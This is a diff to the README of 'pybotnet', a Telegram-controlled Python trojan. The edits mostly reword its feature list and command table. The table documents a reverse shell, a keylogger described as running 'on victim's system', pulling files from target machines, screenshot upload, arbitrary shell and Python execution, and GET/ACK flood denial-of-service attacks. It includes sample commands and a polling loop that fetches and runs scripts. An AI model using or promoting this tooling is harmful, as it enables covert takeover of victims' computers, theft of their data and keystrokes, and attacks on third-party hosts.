@@ -26,16 +26,16 @@
 * Telegram anti-filter control panel
 * reverse shell
 * keylogger
-* get target info 
+* extract target info 
 * sleep source by Optional message
-* export file to targets system
-* import file from target system 
-* get screenshot
+* export file/s to target's system
+* import file/s from target's system 
+* screenshot
 * Task Scheduler
-* Open Website
-* Play Sound
-* Denial-Of-Service Attack
-* Run python code
+* Website Opener
+* Sound Player
+* Denial-Of-Service Attacker
+* Python Code runner
 
 for more, see commands table at the end of this page 
 
@@ -75,33 +75,33 @@ bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
 delay = 10
 
 while True:
-    print('*-*'*15)
-    bot.get_and_execute_scripts_by_third_party_proxy()
-    time.sleep(delay)
+  print('*-*'*15)
+  bot.get_and_execute_scripts_by_third_party_proxy()
+  time.sleep(delay)
 
 ```
 
 ### Commmands:
 
-> Send this COMMANDs to your api bot in telegram, using the admin account.
+> Send the desired command to your bot in telegram, using the admin account registered in the trojan.
 
->  for run command on one target:  `<Target_MAC_Address> <command>`   `66619484755211 get_info` 
+>  to run a command on only one target, use :  `<Target_MAC_Address> <command>` ,Example:  `66619484755211 get_info` 
 
 
-COMMAND | Sample | DO THIS | version | tested on |
+COMMAND | Sample | DOES THIS | version | tested on |
 --------|--------|---------|--------------------------|-----------|
-`get_info` | `get_info` |return system info | 0.06 | windows, linux |
-`do_sleep <scconds> <message (Optional)>` | `do_sleep 99999 hi, i see you!` | \<if message != none : print(message) > ; time.sleep(seccond) | 0.08 | windows, linux |
-`cmd <system command>` | `cmd mkdir new_folder` `cmd cd ..`, `cmd ls` | run system command in shell or cmd | 0.07 | windows, linux|
-`export_file <link>` | `export_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` | target donwload this file and save to script path | 0.14 | windows, linux|
-`import_file <file_route>` |`import_file /home/onionj/folder/somting.png` | get a file from target system (limit:5GB & 20min)| 0.17.0 |  windows, linux|
-`screenshot` | `screenshot` | Takes a screenshot, uploads it to the online server and return the download link | 0.18.1 |  windows, linux |
-`help` | `help` | send commands help | 0.18.5 | windows, linux |
-`/start` | `/start` | run `help` command !! | 0.18.7 | windows, linux |
-`<MAC_Address> reverse_shell` or `reverse_shell`| `66619484755211 reverse_shell` and `exit` for exit!| start reverse shell on target system | 0.20.1 | windows, linux |
+`get_info` | `get_info` | returns system info | 0.06 | windows, linux |
+`do_sleep <scconds> <message (Optional)>` | `do_sleep 99999 hi, i see you!` | Sleeps with printing a message. | 0.08 | windows, linux |
+`cmd <system command>` | `cmd mkdir new_folder` `cmd cd ..`, `cmd ls` | runs system commands in shell or cmd | 0.07 | windows, linux|
+`export_file <link>` | `export_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` | file will be exported on the target machine and saved to the script path | 0.14 | windows, linux|
+`import_file <file_route>` |`import_file /home/onionj/folder/somting.png` | imports a file from target system (limit:5GB & 20min)| 0.17.0 |  windows, linux|
+`screenshot` | `screenshot` | Takes a screenshot, uploads it to the online server and returns the download link | 0.18.1 |  windows, linux |
+`help` | `help` | sends help menu | 0.18.5 | windows, linux |
+`/start` | `/start` | runs `help` command !! | 0.18.7 | windows, linux |
+`<MAC_Address> reverse_shell` or `reverse_shell`| `66619484755211 reverse_shell` and `exit` for exit!| starst reverse shell on the target machine | 0.20.1 | windows, linux |
 `keylogger` | `keylogger start` and `keylogger stop` to stop the keylogger | Starts a keylogger on victim's system. *keylogger can't handle persian words very correctly* | 0.21.1 | windows, linux 
-`scheduler` | `scheduler start ,stop , list` | Adds a schedule | 0.25.3 | windows, linux
-`playsound` | `playsound <sound-name>` | Will play a sound . Playsound can only play MP3 or WAV Files. | 0.25.3 | windows, linux
+`scheduler` | `scheduler start ,stop , list` | Adds a schedule to be run each n second | 0.25.3 | windows, linux
+`playsound` | `playsound <sound-name>` | Will play a sound. Playsound can only play MP3 or WAV Files. | 0.25.3 | windows, linux
 `openurl` | `openurl <url> <how-many-times>` | Will open a url n times. | 0.25.3 | windows, linux
 `dos` | `dos <attack-type [GETFlood-ACKFlood]> <target-ip> <target-port> <thread-number> <payload-size>` | Will run Denial-Of-Service Attack. | 1.0.0 | windows
 `runcode` | `runcode <code>` | Will run python code, The code should be written in a seperate line with correct python syntax, Because of python limitations , The function can't return the results. | 1.0.0 | windows, Linux
@@ -115,7 +115,7 @@ COMMAND | Sample | DO THIS | version | tested on |
 
 
 ## Contributors ✨
-Thanks goes to these wonderful people
+Thanks goes to these wonderful people :
 
 <table>
 <td align="center"><a href="https://github.com/onionj"><img src="https://avatars.githubusercontent.com/u/77416478?v=4" width="70px;" alt=""/><br /><sub><b>oNion</b></sub></a><br /></td>
